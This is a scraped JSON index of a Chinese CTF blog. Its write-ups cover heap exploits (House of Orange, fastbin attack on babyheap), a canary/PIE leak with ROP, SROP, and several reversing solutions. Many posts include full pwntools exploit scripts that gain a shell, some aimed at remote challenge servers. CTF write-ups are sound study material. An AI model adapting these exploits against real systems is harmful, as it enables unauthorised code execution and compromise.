0xf6,0x3d,0xf0,0x10,0x63,0x0,0x0,0x0,0xf8,0xf2,0x3d,0xf6,0x32,0xf0,0x10,0x44,0x0,0x0,0x0,0xf8,0xf2,0x3e,0xf6,0x27,0xf0,0x10,0x6a,0x0,0x0,0x0,0xf8,0xf2,0x3f,0xf6,0x1c,0xf0,0x10,0x79,0x0,0x0,0x0,0xf8,0xf2,0x40,0xf6,0x11,0xf0,0x10,0x65,0x0,0x0,0x0,0xf8,0xf2,0x41,0xf6,0x6,0xf7,0x1,0x0,0x0,0x0,0xf3,] 0xf0使a=0xf0后面的第二个数 0xf8使a凯撒移位2位 0xf2比较输入与a是否相等 0xf6如果相等则向下运行，否则改变程序流程 0xf7使标记success和failed的标志位为success 0xf3结束程序 加密解密不是很复杂，贴上脚本： 12345678910s=[0x66,0x63,0x6a,0x6a,0x6d,0x57,0x6d,0x73,0x45,0x6d,0x72,0x52,0x66,0x63,0x44,0x6a,0x79,0x65]flag=&apos;&apos;for i in s: if i&gt;=ord(&apos;a&apos;) and i&lt;=ord(&apos;z&apos;): flag+=chr((i-ord(&apos;a&apos;)+2)%26+ord(&apos;a&apos;)) elif i&gt;=ord(&apos;A&apos;) and i&lt;=ord(&apos;Z&apos;): flag+=chr((i-ord(&apos;A&apos;)+2)%26+ord(&apos;A&apos;)) else: flag+=chr(i)print flag","categories":[],"tags":[]},{"title":"CGCTF-homura_note","slug":"CGCTF-homura-note","date":"2019-04-17T11:03:01.000Z","updated":"2019-04-17T11:27:26.149Z","comments":true,"path":"2019/04/17/CGCTF-homura-note/","link":"","permalink":"http://yoursite.com/2019/04/17/CGCTF-homura-note/","excerpt":"House of Orange &amp; Fastbin Attack","text":"House of Orange &amp; Fastbin Attack 简单分析程序初始化了2个大小为0x88的note，内容是两个字符串。 程序有三个函数，add，show和pandorabox。 其中，add函数功能是分配一个note，大小限制为0-4096字节，但是读入内容时没有限制大小，存在堆溢出。 show函数功能是输出一个note的内容。 pandorabox函数只能使用一次，功能为输出初始的两个note的内容，然后free这两个note进unsortedbin，fd和bk指针指向main_arena+88，但是并没有把指向这两个note的指针置零，所以执行完这个函数之后使用show函数输出note0的内容，就可以得到main_arena+88的地址，也就得到了libc的所有地址。 House of OrangeHouse of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。 通过控制top chunk的size，可以使得free出的是fastbin，并且控制fastbin的size是0x71，这样在之后能够在malloc_hook之前构造大小为0x7f的chunk，使用Fastbin Attack写内容到malloc_hook。 1add(0xe40,&apos;d&apos;*0xe40+p64(0)+p64(0x91)) add(0x90,&apos;c&apos;) 经过精心的构造，这样就分配出size为0x71的fastbin。 Fastbin Attack在进行Fastbin Attack，还需要先泄漏libc地址： 1sh.recvuntil(&quot;&gt;&gt;&quot;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;(yes:1)&apos;) sh.sendline(&apos;1&apos;) show(0) sh.recvuntil(&apos;:&apos;) leak=u64(sh.recv(6)+&quot;\\x00\\x00&quot;) fakechunk=leak-88-16-0x20-3 onegadget_addr=leak-88-0x3bfb00+0xf241b 此时Fastbin里只有一块，并且fd指针指向0x0，设法修改fd指针，即可实现Fastbin Attack。 因为之前使用pandorabox时，free掉了初始化的两个note，并且合并成了一块大小为0x121。 这时申请一块大小为0x110的note，就会分配到之前初始化的note的地址，因为这个地址是在置入fastbin的note之前的，所以利用堆溢出可以修改fd指针。 1add(0x110,&apos;a&apos;*0xf60+p64(0)+p64(0x71)+p64(fakechunk)) add(0x60,&apos;a&apos;) add(0x60,&apos;a&apos;*19+p64(onegadget_addr)) sh.interactive() 之后再申请一块任意大小的note，就会调用malloc_hook里的onegadget，获取shell。 利用脚本1from pwn import * #sh=process(&apos;./note&apos;) sh=remote(&apos;45.76.173.177&apos;,5678) libc=ELF(&apos;./libc6_2.24-12ubuntu1_amd64.so&apos;) onegadget=[0x45556,0x455aa,0xf15a1,0xf241b] def add(size,content): sh.recvuntil(&apos;&gt;&gt;&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;:&apos;) sh.sendline(str(int(size))) sh.recvuntil(&apos;:&apos;) sh.sendline(content) def show(index): sh.recvuntil(&apos;&gt;&gt;&apos;) sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;:&apos;) sh.sendline(str(index)) add(0xe40,&apos;d&apos;*0xe40+p64(0)+p64(0x91)) add(0x90,&apos;c&apos;) sh.recvuntil(&quot;&gt;&gt;&quot;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;(yes:1)&apos;) sh.sendline(&apos;1&apos;) show(0) sh.recvuntil(&apos;:&apos;) leak=u64(sh.recv(6)+&quot;\\x00\\x00&quot;) fakechunk=leak-88-16-0x20-3 onegadget_addr=leak-88-0x3bfb00+0xf241b add(0x110,&apos;a&apos;*0xf60+p64(0)+p64(0x71)+p64(fakechunk)) add(0x60,&apos;a&apos;) add(0x60,&apos;a&apos;*19+p64(onegadget_addr)) sh.interactive()","categories":[],"tags":[]},{"title":"从零开始的Ubuntu16.04配置","slug":"从零开始的Ubuntu16-04配置","date":"2019-04-15T11:47:01.000Z","updated":"2019-04-16T06:22:02.634Z","comments":true,"path":"2019/04/15/从零开始的Ubuntu16-04配置/","link":"","permalink":"http://yoursite.com/2019/04/15/从零开始的Ubuntu16-04配置/","excerpt":"记录一下，方便以后虚拟机爆炸时重新配置。","text":"记录一下，方便以后虚拟机爆炸时重新配置。 换源跳到更新源文件所在的目录下，终端执行： cd /etc/apt/ 此时，我们可以在当前目录看一下里面的文件，终端执行: ls 我们会看到当前目录下所有文件，不出意外 会有一个sources.list文件，这个文件里面写的就是更新源。我们接下来都是对它进行操作 将原来的更新源备份一下，注意要用管理员权限进行操作，终端执行： sudo cp sources.list copy_sources.list 此时，当前目录下会多一个copy_sources.list的文件，是我们自己的备份，万一我们把更新源改坏了，还可以恢复回来 更换更新源，终端执行： sudo gedit sources.list 然后复制想换的源进去保存就可以了 阿里源： 123456789101112131415161718# deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricteddeb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse 更新源，终端执行： sudo apt update 安装pip终端执行： sudo apt install python-pip pip换源新建一个~/.pip/pip.conf 内容为： 1234[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple[install]trusted-host=mirrors.aliyun.com 更新pip终端执行： sudo pip install --upgrade pip 终端执行： sudo gedit /usr/bin/pip 将 from pip import main 改为 from pip._internal import main 保存即可 安装git终端执行： sudo apt install git 安装ruby终端执行： sudo apt install ruby 安装pwntools终端执行： sudo pip install pwntools 安装pwndbg终端执行： 123git clone https://github.com/pwndbg/pwndbgcd pwndbgsudo ./setup.sh 安装one_gadget终端执行： sudo gem install one_gadget 安装z3终端执行： pip install z3-solver 安装open-cv终端执行： pip install opencv-python 安装angr终端执行： 12345pip install virtualenvwrapperexport WORKON_HOME=$HOME/Python-workhomesource /usr/local/bin/virtualenvwrapper.shmkvirtualenv angrpip install angr 为方便以后使用，写一个vr.sh： 12export WORKON_HOME=$HOME/Python-workhomesource /usr/local/bin/virtualenvwrapper.sh 使用时，终端执行： 12. vr.shworkon angr 进入安装好angr的虚拟环境","categories":[],"tags":[]},{"title":"PinTool安装与简单使用","slug":"PinTool安装与简单使用","date":"2019-04-14T16:26:11.000Z","updated":"2019-04-15T11:44:54.903Z","comments":true,"path":"2019/04/15/PinTool安装与简单使用/","link":"","permalink":"http://yoursite.com/2019/04/15/PinTool安装与简单使用/","excerpt":"整了好久…话说去年看东南平台上的那道mov时就想试试pin了，结果一直不知道咋整，上周六东南校赛又出了一道几乎一样的题，迫使我从零开始重新弄了一遍，最后结合很多dalao的教程终于能跑起来了。","text":"整了好久…话说去年看东南平台上的那道mov时就想试试pin了，结果一直不知道咋整，上周六东南校赛又出了一道几乎一样的题，迫使我从零开始重新弄了一遍，最后结合很多dalao的教程终于能跑起来了。 下载微软官方网址 选择对应的系统下载并解压即可 我这里使用的是linux版本，osx版本在之后使用时需要关闭sip保护，也不是很困难但是既然linux可以直接用就不搞那么麻烦了 编译12cd pin/source/tools/ManualExamples/make TARGET=ia32/intel64 #可以指定目标版本 编译好之后当前目录就会出现obj-ia32/obj-intel64文件夹，之后根据文件是32位/64位使用对应的文件夹里的.so文件。 使用这里贴上东南平台上的mov的解题脚本 只要编译好之前的ManualExamples就能运行，算是pin最简单的使用了 1#!/usr/bin/env python #-*- coding:utf-8 -*- import popen2,string INFILE = &quot;test&quot; CMD = &quot;~/pin/pin -t ~/pin/source/tools/ManualExamples/obj-ia32/inscount1.so -- ~/mov.dms &lt; &quot; + INFILE choices = &quot;(_ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;abcdefghijklmnopqrstuvwxyz0123456789!#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\\]^`|~&quot;#自定义爆破字典顺序，将数字和小写字母提前可以使得速度快一些~ def execlCommand(command): global f fin,fout = popen2.popen2(command) result1 = fin.readline()#获取程序自带打印信息，wrong或者correct print result1 result2 = fin.readline()#等待子进程结束,结果输出完成 fin.close() def writefile(data): fi = open(INFILE,&apos;w&apos;) fi.write(data) fi.close() flag = &apos;&apos; while 1: l = 0#初始化计数器 for i in choices: key = flag + i print &quot;&gt;&quot;,key writefile(key) execlCommand(CMD) fi = open(&apos;./inscount.out&apos;, &apos;r&apos;) while(1): try: n = int(fi.read().split(&apos; &apos;)[1], 10) break except IndexError: continue fi.close() print n if(l-n &gt; 1 and l):#如果两次运行指令差别过大，说明字符正确 flag += i print flag break else: l = n if &apos;&#125;&apos; in flag: break print flag 脚本有点小问题，字典第一个字符最好放一个不可能出现在flag里的字符。 跑的电脑好烫","categories":[],"tags":[]},{"title":"bugku-pwn3","slug":"bugku-pwn3","date":"2019-04-08T12:25:46.000Z","updated":"2019-04-08T12:46:20.796Z","comments":true,"path":"2019/04/08/bugku-pwn3/","link":"","permalink":"http://yoursite.com/2019/04/08/bugku-pwn3/","excerpt":"题目保护全开，leak canary+libc。","text":"题目保护全开，leak canary+libc。 好久没发blog了 思路程序有两次输入机会，第一次可以任意输入，同时输入完还会打印出输入的内容。第二次最多只能输入624个字符，而输入624个字符正好可以把返回地址覆盖完毕。通过把返回地址覆盖成main地址，实现多次运行main函数，完成所需的leak以及最终获取shell。 第一次运行main第一次输入，覆盖掉canary的\\x00位，在之后程序就会打印出canary，第二次输入的时候就可以绕过canary保护。PIE保护会导致程序的地址随机化，但是后三位是不会变的，例如第二次输入完后程序的返回地址main+e的后三位就是0xd2e，利用输入把2e覆盖成20，程序就会再次运行main函数。 第二次运行main第一次输入时，覆盖到返回地址前，这样程序会打印出main+e的地址，结合ida分析的结果可以得到程序的基址。第二次输入同第一次main函数。 第三次运行main第一次输入时，布置好栈，使程序运行puts，打印出puts的got表地址，同时打印完返回到main函数。第二次输入同第一次输入，但是只需要624个字符。 第四次运行main第一次输入时，布置好栈，使程序运行puts，打印出read的got表地址，同时打印完返回到main函数。第二次输入同第一次输入，但是只需要624个字符。 获取了read和puts的地址后就可以知道libc的版本以及基址。 第五次运行main第一次输入忽略，第二次输入把返回地址修改成onegadget地址。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *puts_plt=0x8b0puts_got=0x202018read_got=0x202048pop_rdi=0xe03sh=remote(&apos;114.116.54.89&apos;,10000)sh.recvuntil(&quot;path:\\n&quot;)sh.sendline(&quot;flag&quot;)sh.recvuntil(&quot;len:\\n&quot;)sh.sendline(&quot;624&quot;)sh.recvuntil(&quot;note:\\n&quot;)sh.sendline(&apos;a&apos;*600)sh.recvuntil(&apos;aaaaaaaaa\\n&apos;)canary=u64(&quot;\\x00&quot;+sh.recv(7))sh.recvuntil(&quot;)\\n&quot;)sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+&apos;\\x20&apos;)sh.recvuntil(&quot;path:\\n&quot;)sh.sendline(&quot;flag&quot;)sh.recvuntil(&quot;len:\\n&quot;)sh.sendline(&quot;624&quot;)sh.recvuntil(&quot;note:\\n&quot;)sh.sendline(&apos;a&apos;*615)sh.recvuntil(&apos;aaaaaaaaa\\n&apos;)main=u64(sh.recv(6)+&quot;\\x00\\x00&quot;)-0xebase=main-0xd20sh.recvuntil(&quot;)\\n&quot;)sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+&apos;\\x20&apos;)sh.recvuntil(&quot;path:\\n&quot;)sh.sendline(&quot;flag&quot;)sh.recvuntil(&quot;len:\\n&quot;)sh.sendline(&quot;1000&quot;)sh.recvuntil(&quot;note:\\n&quot;)sh.sendline(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base)+p64(puts_got+base)+p64(puts_plt+base)+p64(main))sh.recvuntil(&quot;)\\n&quot;)sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base))puts=u64(sh.recv(6)+&quot;\\x00\\x00&quot;)print hex(puts)sh.recvuntil(&quot;path:\\n&quot;)sh.sendline(&quot;flag&quot;)sh.recvuntil(&quot;len:\\n&quot;)sh.sendline(&quot;1000&quot;)sh.recvuntil(&quot;note:\\n&quot;)sh.sendline(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base)+p64(read_got+base)+p64(puts_plt+base)+p64(main))sh.recvuntil(&quot;)\\n&quot;)sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base))read=u64(sh.recv(6)+&quot;\\x00\\x00&quot;)print hex(read)libc=read-0x0f7250sh.recvuntil(&quot;path:\\n&quot;)sh.sendline(&quot;flag&quot;)sh.recvuntil(&quot;len:\\n&quot;)sh.sendline(&quot;1000&quot;)sh.recvuntil(&quot;note:\\n&quot;)sh.sendline(&apos;a&apos;*600)sh.recvuntil(&quot;)\\n&quot;)sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+p64(0xf1147+libc))sh.interactive()","categories":[],"tags":[]},{"title":"0ctf2017-babyheap","slug":"0ctf2017-babyheap","date":"2019-03-27T14:43:07.000Z","updated":"2019-03-27T17:16:12.777Z","comments":true,"path":"2019/03/27/0ctf2017-babyheap/","link":"","permalink":"http://yoursite.com/2019/03/27/0ctf2017-babyheap/","excerpt":"fastbin attack，比cgctf的note稍微难一点。","text":"fastbin attack，比cgctf的note稍微难一点。 保护全开，思路和cgctf的note是一样的，当时做的时候因为找不到wp，就是对着这道题的wp做的。 当只有一个 small/large chunk 被释放时，small/large chunk的 fd 和 bk 指向 main_arena 中的地址。如果泄漏出这里fd或bk指向的地址，那么就可以得到libc基址。最后利用malloc_hook，可以执行onegadget，获取shell。 这道题比cgctf的note难的是，这道题不存在UAF，所以泄漏main_arena的地址变得稍微难了一点，但是利用fastbinattack还是可以做到的。 12allocate(0x10) #用来 allocate(0x10) #实现 allocate(0x10) #fastbin attack allocate(0x10) #用来修改下一个chunk的size allocate(0x80) #用来泄漏main_arena allocate(0x80) #使上一个chunk free后能指向main_arena free(1) free(2) fill(0,0x41,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+&quot;\\x80&quot;) fill(3,0x20,p64(0)*3+p64(0x21)) allocate(0x10) allocate(0x10) fill(3,0x20,p64(0)*3+p64(0x91)) free(4) dump(2) leak=sh.recv(8) libc_base=u64(leak)-0x3c4b20-88malloc_hook=libc_base+0x3c4b20-10 这里通过修改第5个chunk的size，2次malloc第五个chunk，index2和index4指向的都是第五个chunk，free4之后dump2就能打印出main_arena+88地址，从而泄漏libc基址。 关于main_arena在libc中的偏移，可以使用ida打开libc文件，在malloc_trim函数中找到。 在调用malloc函数时，程序会对malloc_hook进行检查，如果不为0，就会调用malloc_hook指向的函数，借此调用onegadget。fastbin是一个单链表，其fd指针会指向下一个可分配的chunk。修改掉最后并进fastbin中的chunk的fd指针，使其指向malloc_hook，这样之后第二次malloc出的chunk就会出现在malloc_hook。但是在malloc之前，程序会对要分配的地址进行检查，如果没有对应size的chunk，就不会在此处分配，所以要进行偏移构造。 可以看到偏移-20-0x3的时候malloc_hook上方就构造出了一个size为0x7f的chunk。 找到的onegadget，尝试发现0x4526a的可以用。 经过尝试，填充大小为19时可以覆盖到malloc_hook exp： 1# -*- coding:utf-8 -*- # from pwn import * def allocate(Size): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Size: &quot;) sh.sendline(str(int(Size))) def fill(Index,Size,Content): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) sh.recvuntil(&quot;Size: &quot;) sh.sendline(str(int(Size))) sh.recvuntil(&quot;Content: &quot;) sh.send(Content) def free(Index): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) def dump(Index): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;4&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) elf = ELF(&apos;./libc.so.6&apos;) sh = process(&apos;./heap-2&apos;) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) allocate(0x80) free(1) free(2) fill(0,0x41,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+&quot;\\x80&quot;) fill(3,0x20,p64(0)*3+p64(0x21)) allocate(0x10) allocate(0x10) fill(3,0x20,p64(0)*3+p64(0x91)) free(4) dump(2) leak=sh.recvuntil(&quot;\\x00\\x00&quot;)[-8:] libc_base=u64(leak)-0x3c4b78 malloc_hook=libc_base+0x3c4b20-0x10 print hex(malloc_hook) allocate(0x60) free(4) fill(2,8,p64(malloc_hook-0x20-0x3)) allocate(0x60) allocate(0x60) fill(6,0x1b,p64(0)*2+&quot;\\x00\\x00\\x00&quot;+p64(libc_base+0x4526a)) allocate(0x1) sh.interactive()","categories":[],"tags":[]},{"title":"栈-SROP","slug":"栈-SROP","date":"2019-03-26T04:30:46.000Z","updated":"2019-03-26T14:01:32.944Z","comments":true,"path":"2019/03/26/栈-SROP/","link":"","permalink":"http://yoursite.com/2019/03/26/栈-SROP/","excerpt":"CTFWIKI-SROP","text":"CTFWIKI-SROP 例题是ichunqiu的一道pwn-smallest。 IDA打开，只有几行汇编，题如其名。 123456789public startstart proc nearxor rax, raxmov edx, 400hmov rsi, rspmov rdi, raxsyscallretnstart endp 调用syscall之前，rax=0，rdi=0，rsi=rsp，edx=0x400 可知执行的是0号syscall，即read(0,$rsp,400)，产生了栈溢出 同时read函数读取的字节数会返回到rax中，如果跳过执行xor rax, rax就可以利用这一点设置rax的值执行想要的syscall。 最后retn会使得rip=[rsp] rsp=rsp+8。 exp： 1# -*- coding:utf-8 -*- # from pwn import * elf = ELF(&apos;./stack-5.&apos;) sh = process(&apos;./stack-5.&apos;) context.arch = &apos;amd64&apos; syscall_addr = 0x4000be start_addr = 0x4000b0 payload = &quot;&quot; payload += p64(start_addr)*3 sh.send(payload) #返回到start，因为之后要通过read返回值修改rax，所以先把之后的返回地址也布置好 sleep(3) sh.send(&apos;\\xb3&apos;) #修改返回地址为0x4000b3，跳过xor，rax的值为1 #执行write(1，rsp，0x400) stack_addr = u64(sh.recv()[8:16]) print &apos;stack addr :&apos;+str(hex(stack_addr)) #接收rsp地址 sigframe = SigreturnFrame() sigframe.rax = constants.SYS_read sigframe.rdi = 0 sigframe.rsi = stack_addr sigframe.rdx = 0x400 sigframe.rsp = stack_addr sigframe.rip = syscall_addr payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe) #read(0,stack_addr_,0x400) sh.send(payload) #修改signal Frame，返回到start sigreturn = p64(syscall_addr) + &apos;\\x00&apos; * 7 #rax=15，执行sigreturn sh.send(sigreturn) #返回到syscall sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = stack_addr + 0x120 #/bin/sh存放地址 sigframe.rsi = 0x0 sigframe.rdx = 0x0 sigframe.rsp = stack_addr sigframe.rip = syscall_addr frame_payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe) #execve(&apos;/bin/sh&apos;,0,0) payload = frame_payload + (0x120 - len(frame_payload)) * &apos;\\x00&apos; + &apos;/bin/sh\\x00&apos; #把/bin/sh读到rsp+0x120 sh.send(payload) #修改signal Frame，返回到start sh.send(sigreturn) #执行sigreturn sh.interactive()","categories":[],"tags":[]},{"title":"KCTF2019Q1","slug":"KCTF2019Q1","date":"2019-03-25T23:47:49.000Z","updated":"2019-07-02T11:48:37.685Z","comments":true,"path":"2019/03/26/KCTF2019Q1/","link":"","permalink":"http://yoursite.com/2019/03/26/KCTF2019Q1/","excerpt":"好菜，这次必看着dalao的wp学习一波。","text":"好菜，这次必看着dalao的wp学习一波。 流浪者1234567891011121314s=&quot;KanXueCTF2019JustForhappy&quot;dic=&quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot;index=[]key=&quot;&quot;for i in s: index.append(dic.find(i))for i in index: if i&gt;=0 and i&lt;=9: key+=chr(i+48) if i&gt;=10 and i&lt;=35: key+=chr(i+87) if i&gt;=36: key+=chr(i+29)print key 初入好望角魔改了一波源代码就可以解密了，毕竟key和iv都给了，不过之前没怎么用代码实现过AES加密，所以选择了魔改源代码，看了dalao们的wp，使用py应该可以代码更简洁一些。 12345678910111213141516171819202122232425using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Security.Cryptography;namespace HelloWorldApplication&#123; class HelloWorld &#123; static void Main(string[] args) &#123; byte[] keyArray = new PasswordDeriveBytes(&quot;Kanxue2019&quot;, null).GetBytes(32); byte[] ivArray = Encoding.UTF8.GetBytes(&quot;Kanxue2019CTF-Q1&quot;); byte[] toEncryptArray = Convert.FromBase64String(&quot;4RTlF9Ca2+oqExJwx68FiA==&quot;); RijndaelManaged rDel = new RijndaelManaged(); rDel.Key = keyArray; rDel.IV = ivArray; rDel.Mode = CipherMode.CBC; rDel.Padding = PaddingMode.Zeros; ICryptoTransform cTransform = rDel.CreateDecryptor(); byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length); Console.WriteLine(UTF8Encoding.UTF8.GetString(resultArray)); &#125; &#125;&#125; REPWN这题当时做的时候完全没意识到栈溢出，所以只做出来前面一半，明明名字给了提示了2333 这里会对输入进行检验，要求从第9位开始是X1Y0uN3tG00d，第21位是H。 这个函数就是栈溢出所在，strcpy时可以覆盖到返回地址，改变程序进程。sub_4013b0限制了输入的前8位，简单的方程组求解，答案是20101001。 由于之前已经限制了第21位输入是H，所以可以知道跳转到的地址的最后两位是f0。由于程序的地址只有六位，所以开头两位必定是00，可以推出第二十四位输入是k。 在IDA里发现0x401bf0处的代码是红色的，没有被识别为函数，这里手动创建一下函数，发现这个函数应该就是需要跳转到的地址，输入应为HaCk。 输入20101001X1Y0uN3tG00dHaCk后程序情况 分析sub_401bf0，发现对输入进行des加密，key为XiyouNet，得到第二部分输入Wel1C0me。 当时没看出栈溢出，但是发现了函数sub_401bf0，只知道最终答案格式是第一次输入加第二次输入，可惜没能分析出des，也不知道怎么样能进行第二次输入，属实鶸。 影分身之术这一题当时甚至还找了出题人去年出的题的wp，结果也是只做出了一半233 首先有一段js混淆，解密后代码： 123456789101112131415function ckpswd() &#123; key = &quot;simpower91&quot;; a = document.all.pswd.value; if (a.indexOf(key) == 0) &#123; l = a.length; i = key.length; sptWBCallback(a.substring(i, l)); &#125; else &#123; alert(&quot;wrong!&lt;&quot; + a + &quot;&gt; is not my GUID ;-)&quot;); return &quot;1234&quot;; &#125;&#125;function ok() &#123; alert(&quot;congratulations!&quot;);&#125; 输入的key的前缀必须是simpower91，之后的字符会作为sptWBCallback的参数，猜测是调用ok函数，不过上网找了半天也不知道怎么样的字符能调用到ok函数… 1234567function sptWBCallback(spt_wb_id,spt_wb_name,optionstr)&#123; url=&apos;#sptWBCallback:id=&apos;; url=url+spt_wb_id+&apos;;eventName=&apos;+spt_wb_name; if(optionstr) url=url+&apos;;params=optionstr&apos;; location=url;&#125; （看了wp之后）跟踪发现这里有一个cmp eax,0x4的操作，simpower91后输入的字符长度为4。 1234567891011121300493FA6 . 55 push ebp 00493FA7 . 68 BA414900 push crackme2.004941BA 00493FAC . 64:FF30 push dword ptr fs:[eax] 00493FAF . 64:8920 mov dword ptr fs:[eax],esp 00493FB2 . 8B45 EC mov eax,dword ptr ss:[ebp-0x14] 00493FB5 . E8 7A07F7FF call crackme2.00404734 00493FBA . 83F8 04 cmp eax,0x4 00493FBD . 0F85 BE010000 jnz crackme2.00494181 00493FC3 . EB 21 jmp short crackme2.00493FE6 00493FC5 .^ E0 B0 loopdne short crackme2.00493F77 00493FC7 . B1 B2 mov cl,0xB2``` 一路跟踪跟进了虚拟机函数，对四个字符的验证为`ord(i)+0x7f==[0xe0, 0xb0, 0xb1, 0xb2]`后四个字符为`a123`# SaveSingleDog听完人人人师傅的讲解豁然开朗，这题属于类型混淆，关键在于利用singledog和luckydog的不同结构及操作。main函数： puts(“This is a little game\\n”); puts(“You can create a character and choose if he needs a partner.\\n”); while ( 1 ) { menu(“You can create a character and choose if he needs a partner.\\n”, argv); read_int(); switch ( (unsigned int)&amp;savedregs ) { case 1u: singledog(); break; case 2u: luckydog(); break; case 3u: edit_singledog(); break; case 4u: edit_luckydog(); break; case 5u: save_singledog(); break; case 6u: exit(1); return; default: continue; } }1234常见的menu，有五个功能可以选择。其中，singledog(): v3 = readfsqword(0x28u); v2 = single_num; if ( single_num == 80 ) { puts(“full”); } else { printf(“Number :%d\\n”, (unsigned int)single_num); buf = malloc(0x20uLL); puts(“Name:”); read(0, buf, 0x20uLL); two[v2] = buf; ++single_num; } return readfsqword(0x28u) ^ v3;12luckydog: v4 = readfsqword(0x28u); v3 = lucky_num; if ( lucky_num == 80 ) { puts(“full”); } else { printf(“Number :%d\\n”, (unsigned int)lucky_num); v0 = malloc(0x20uLL); buf = malloc(0x20uLL); *v0 = buf; puts(“Name”); read(0, v0 + 1, 0x18uLL); puts(“your partner’s name”); read(0, buf, 0x20uLL); one[v3] = v0; ++lucky_num; } return readfsqword(0x28u) ^ v4;12可以对比两个dog之间的不同，singledog中的two存放的是一级指针，指向的地址存放着0x20长度的name，而luckydog中的one存放的是二级指针v0,v0指向的是buf的地址，buf指向的是partner&apos;s name，同时还有一个0x18长度的name，结构可以表示为： singledog: two[v2]: buf --&gt; name luckydog: one[v3]: v0 --&gt; buf --&gt; name v0+1 --&gt; partner&apos;s name 123buf占0x20的空间，v0占0x8的空间，v0+1占0x18的空间。在edit时，没有对one或two的越界检查，而且在one和two的存放方式如下： .data:0000000000202008 public dso_handle.data:0000000000202008 dso_handle dq offset dso_handle ; DATA XREF: do_global_dtors_aux+17↑r.data:0000000000202008 ; .data:dso_handle↓o.data:0000000000202008 _data ends.data:0000000000202008LOAD:0000000000202010 ; ===========================================================================LOAD:0000000000202010LOAD:0000000000202010 ; Segment type: Pure dataLOAD:0000000000202010 ; Segment permissions: Read/WriteLOAD:0000000000202010 LOAD segment byte public ‘DATA’ use64LOAD:0000000000202010 assume cs:LOADLOAD:0000000000202010 ;org 202010hLOAD:0000000000202010 public bss_startLOAD:0000000000202010 bss_start db ? ; ; DATA XREF: deregister_tm_clones↑oLOAD:0000000000202010 ; register_tm_clones↑o …LOAD:0000000000202010 ; Alternative name is ‘_edata’LOAD:0000000000202010 ; TMC_END__LOAD:0000000000202010 ; _edataLOAD:0000000000202011 db ? ;LOAD:0000000000202012 db ? ;LOAD:0000000000202013 db ? ;LOAD:0000000000202014 db ? ;LOAD:0000000000202015 db ? ;LOAD:0000000000202016 db ? ;LOAD:0000000000202017 unk_202017 db ? ; ; DATA XREF: deregister_tm_clones+7↑oLOAD:0000000000202018 db ? ;LOAD:0000000000202019 db ? ;LOAD:000000000020201A db ? ;LOAD:000000000020201B db ? ;LOAD:000000000020201C db ? ;LOAD:000000000020201D db ? ;LOAD:000000000020201E db ? ;LOAD:000000000020201F db ? ;LOAD:000000000020201F LOAD endsLOAD:000000000020201F.bss:0000000000202020 ; ===========================================================================.bss:0000000000202020.bss:0000000000202020 ; Segment type: Uninitialized.bss:0000000000202020 ; Segment permissions: Read/Write.bss:0000000000202020 ; Segment alignment ‘32byte’ can not be represented in assembly.bss:0000000000202020 _bss segment para public ‘BSS’ use64.bss:0000000000202020 assume 